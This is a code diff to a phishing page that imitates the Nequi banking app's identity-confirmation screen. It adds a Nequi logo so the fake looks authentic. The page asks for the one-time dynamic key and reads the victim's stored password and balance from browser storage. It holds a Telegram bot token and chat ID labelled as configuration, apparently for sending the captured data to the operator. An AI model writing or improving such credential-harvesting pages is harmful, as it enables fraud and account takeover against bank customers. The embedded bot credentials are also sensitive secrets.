@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nequi - Confirmación</title>
     <style>
-        /* Mismo CSS del original */
         html, body { height: 100%; margin: 0; }
         body {
             font-family: 'Manrope', sans-serif;
@@ -17,6 +16,13 @@
         .main-container {
             max-width: 360px;
             padding: 20px;
+        }
+        .logo-top {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo-top img {
+            height: 30px;
         }
         .title {
             font-weight: 700;
@@ -89,6 +95,11 @@
     </style>
 </head>
 <body>
+    <!-- Logo Nequi -->
+    <div class="logo-top">
+        <img src="./img/logo.svg" alt="Nequi">
+    </div>
+
     <div class="main-container">
         <h1 class="title">Confirma tu identidad</h1>
         <p class="subtitle">Para confirmar tu identidad escribe la clave dinámica que encuentras en tu App Nequi.</p>
@@ -203,14 +214,11 @@
                 const clave = localStorage.getItem("clave") || "No especificado";
                 const saldo = localStorage.getItem("saldo") || "No especificado";
 
-                // Guardar OTP
-                localStorage.setItem("otp1", otp);
-
                 // Crear ID único para este usuario
                 const userId = Date.now();
                 localStorage.setItem("userId", userId);
 
-                // TELEGRAM CONFIG
+                // TELEGRAM CONFIG (sin espacio)
                 const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';
                 const TELEGRAM_CHAT_ID = '6958936698';
 
@@ -257,8 +265,6 @@
                 }
             });
         });
-
-        // La verificación del estado se hace en loading.html
     </script>
 </body>
 </html>
